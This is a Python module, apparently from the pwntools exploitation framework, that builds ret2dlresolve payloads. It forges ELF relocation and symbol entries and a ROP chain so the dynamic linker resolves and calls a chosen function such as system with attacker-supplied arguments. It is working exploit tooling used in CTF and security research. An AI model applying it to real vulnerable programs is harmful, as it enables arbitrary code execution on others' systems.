from copy import deepcopy

from pwnlib.context import context
from pwnlib.log import getLogger
from pwnlib.rop import ROP
from pwnlib.util.packing import *


log = getLogger(__name__)

class Elf32_Rel(object):
    size=1 # see build method for explanation
    """
    typedef struct elf32_rel {
        Elf32_Addr	r_offset;
        Elf32_Word	r_info;
    } Elf32_Rel;
    """
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info

    def __bytes__(self):
        return p32(self.r_offset) + p32(self.r_info)

    def __str__(self):
        return str(bytes(self))

    def __flat__(self):
        return bytes(self)


class Elf64_Rel(object):
    size=24
    """
    typedef struct elf64_rel {
        Elf64_Addr r_offset;
        Elf64_Xword r_info;
    } Elf64_Rel;
    """
    def __init__(self, r_offset=0, r_info=0):
        self.r_offset = r_offset
        self.r_info = r_info

    def __bytes__(self):
        return p64(self.r_offset) + p64(self.r_info) + p64(0)

    def __str__(self):
        return str(bytes(self))

    def __flat__(self):
        return bytes(self)


class Elf32_Sym(object):
    size = 16
    """
    typedef struct elf32_sym{
        Elf32_Word	st_name;
        Elf32_Addr	st_value;
        Elf32_Word	st_size;
        unsigned char	st_info;
        unsigned char	st_other;
        Elf32_Half	st_shndx;
    } Elf32_Sym;
    """
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        # St_info and st_other can be int, str or byte,
        # they'll be saved as int
        if not isinstance(st_info, int):
            st_info = context._encode(st_info)[0]
        if not isinstance(st_other, int):
            st_other = context._encode(st_other)[0]

        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx

    def __bytes__(self):
        return p32(self.st_name) + \
            p32(self.st_value) + \
            p32(self.st_size) + \
            p8(self.st_info) + \
            p8(self.st_other) + \
            p16(self.st_shndx)

    def __str__(self):
        return str(bytes(self))

    def __flat__(self):
        return bytes(self)

class Elf64_Sym(object):
    size=24
    """
    typedef struct elf64_sym {
        Elf64_Word st_name;
        unsigned char	st_info;
        unsigned char	st_other;
        Elf64_Half st_shndx;
        Elf64_Addr st_value;
        Elf64_Xword st_size;
    } Elf64_Sym;
    """
    def __init__(self, st_name=0, st_value=0, st_size=0, st_info=0, st_other=0, st_shndx=0):
        if not isinstance(st_info, int):
            st_info = context._encode(st_info)[0]
        if not isinstance(st_other, int):
            st_other = context._encode(st_other)[0]
            
        self.st_name = st_name
        self.st_value = st_value
        self.st_size = st_size
        self.st_info = st_info
        self.st_other = st_other
        self.st_shndx = st_shndx

    def __bytes__(self):
        return p32(self.st_name) + \
            p8(self.st_info) + \
            p8(self.st_other) + \
            p16(self.st_shndx) + \
            p64(self.st_value) + \
            p64(self.st_size)

    def __str__(self):
        return str(bytes(self))

    def __flat__(self):
        return bytes(self)


class MarkedBytes(bytes):
    pass


class Ret2dlresolve(object):
    def __init__(self, elf, symbol_name):
        self.elf = elf
        self.elf_base = elf.address if elf.pie else 0
        self.strtab = elf.dynamic_value_by_tag("DT_STRTAB") + self.elf_base
        self.symtab = elf.dynamic_value_by_tag("DT_SYMTAB") + self.elf_base
        self.jmprel = elf.dynamic_value_by_tag("DT_JMPREL") + self.elf_base
        self.symbol_name = context._encode(symbol_name)

        self._reloc_index = -1
        self._data_addr = -1
        self._built = False
        self._payload = ""

        # PIE is untested, gcc forces FULL-RELRO when PIE is set
        if self.elf.pie and self.elf_base == 0:
            log.warning("WARNING: ELF is PIE but it has not base address")

    def _padding(self, payload_len, modulo):
        if payload_len % modulo == 0: return b""
        return (modulo - (payload_len%modulo))*b"A"

    @property
    def reloc_index(self):
        if not self._built:
            log.error("Error accessing reloc_index: please build first")
        return self._reloc_index

    @property
    def payload(self):
        if not self._built:
            log.error("Error accessing payload: please build first")
        return self._payload

    def get_recommended_address(self):
        bss = self.elf.get_section_by_name(".bss").header.sh_addr + self.elf_base
        bss_size = self.elf.get_section_by_name(".bss").header.sh_size
        addr = bss + bss_size
        addr = addr + (0x1000-(addr % 0x1000)) - 0x100 #next page in memory - 0x100
        return addr
        
    def build(self, data_addr):
        self._data_addr = data_addr

        if context.bits == 32:
            ElfSym = Elf32_Sym
            ElfRel = Elf32_Rel
        elif context.bits == 64:
            ElfSym = Elf64_Sym
            ElfRel = Elf64_Rel
        else:
            log.error("Unsupported bits")

        # where the address of the symbol will be saved
        # (ElfRel.r_offset)
        payload = b"A"*context.bytes

        # Symbol name. Ej: system
        symbol_name_addr = data_addr + len(payload)
        payload += self.symbol_name + b"\x00"
        payload += self._padding(data_addr + len(payload) - self.symtab, ElfSym.size)

        # ElfSym
        sym_addr = data_addr + len(payload)
        sym = ElfSym(st_name=symbol_name_addr - self.strtab)
        payload += bytes(sym)
        payload += self._padding(data_addr + len(payload) - self.jmprel, ElfRel.size)

        # ElfRel
        rel_addr = data_addr + len(payload)
        index = (sym_addr - self.symtab) // ElfSym.size
        # different ways of codifying r_info
        if context.bits == 64:
            index = index << 32
        else: # 32
            index = index << 8
        rel_type = 7
        rel = ElfRel(r_offset=data_addr, r_info=index+rel_type)
        payload += bytes(rel)

        # It seems to be treated as an index in 64b and
        # as an offset in 32b. That's why Elf32_Rel.size = 1
        self._reloc_index = (rel_addr - self.jmprel)//ElfRel.size
        
        log.debug("Symtab: %s", hex(self.symtab))
        log.debug("Strtab: %s", hex(self.strtab))
        log.debug("Jmprel: %s", hex(self.jmprel))
        log.debug("ElfSym addr: %s", hex(sym_addr))
        log.debug("ElfRel addr: %s", hex(rel_addr))
        log.debug("Symbol name addr: %s", hex(symbol_name_addr))
        log.debug("Data addr: %s", hex(data_addr))

        self._built = True
        self._payload = payload
        return payload

class Queue(list):
    def size(self):
        size = 0
        for v in self:
            # Lists, strings and ints all have size context.size
            # Assuming int size equals address size
            if isinstance(v, MarkedBytes):
                size += len(v)
            else:
                size += context.bytes
        return size

class Ret2dlresolveRop(Ret2dlresolve):
    def __init__(self, elf, symbol, args):
        super().__init__(elf, symbol)
        self.args = args
        self.plt_init = elf.get_section_by_name(".plt").header.sh_addr + self.elf_base
        self._args_f = [] # formatted args, ready for call

    def _format_args(self):
        # Encode every string in args and add padding to it
        def aux(args):
            for i, arg in enumerate(args):
                if isinstance(arg, (str,bytes)):
                    # Not sure if padding is needed
                    args[i] = context._encode(args[i]) + b"\x00"
                    args[i] += self._padding(len(args[i]), context.bytes)
                elif isinstance(arg, (list, tuple)):
                    aux(arg)

        self._args_f = deepcopy(self.args)
        aux(self._args_f)


    def build(self, data_addr):
        # The first part of the payload is the usual of ret2dlresolve.
        # The second part will include strings and pointers needed for ROP.
        payload = super().build(data_addr)
        log.debug("Pltinit: %s", hex(self.plt_init))
        self._format_args()
        
        queue = Queue()

        # We first have to process the arguments: replace lists and strings with
        # pointers to the payload.
        for i, arg in enumerate(self._args_f):
            if isinstance(arg, (list, tuple)):
                self._args_f[i] = data_addr + len(payload) + queue.size()
                queue.extend(arg)
            elif isinstance(arg, bytes): 
                # If one of the arguments is a string, add it to the payload
                # and replace it with its address
                self._args_f[i] = data_addr + len(payload) + queue.size()
                queue.append(MarkedBytes(arg))

        # Now we process the generated queue, which contains elements that will be in
        # the payload. We replace lists and strings with pointers, add lists elements
        # to the queue, and mark strings so next time they are processed they are 
        # added and not replaced again.
        while len(queue) > 0:
            top = queue[0]
            if isinstance(top, (list, tuple)):
                top = pack(data_addr + len(payload) + queue.size())
                queue.extend(queue[0])
            elif isinstance(top, MarkedBytes):
                pass
            elif isinstance(top, bytes):
                top = pack(data_addr + len(payload) + queue.size())
                queue.append(MarkedBytes(queue[0]))
            elif isinstance(top, int):
                top = pack(top)
            else:
                pass

            payload += top
            #print("Processed:", queue[0], "Appended:", top.hex())
            queue.pop(0)

        self._payload = payload
        return payload

    def get_rop(self, read_func="read", read_func_args=None):
        if not self._built:
            log.error("Error attempting get_rop: please build first")

        if read_func_args is None:
            read_func_args = [0, self._data_addr, len(self.payload)]

        rop = ROP(self.elf)
        rop.call(read_func, read_func_args)
        if context.bits == 64:
            rop.call(self.plt_init, self._args_f)
            rop.raw(self.reloc_index)
        else: 
            # not a regular x86 call
            rop.raw(self.plt_init)    # ret to plt_init
            rop.raw(self.reloc_index) # arg for plt init
            rop.raw(0xDEADBEEF)       # ret
            for arg in self._args_f:  # args for the called symbol
                rop.raw(arg)
        return rop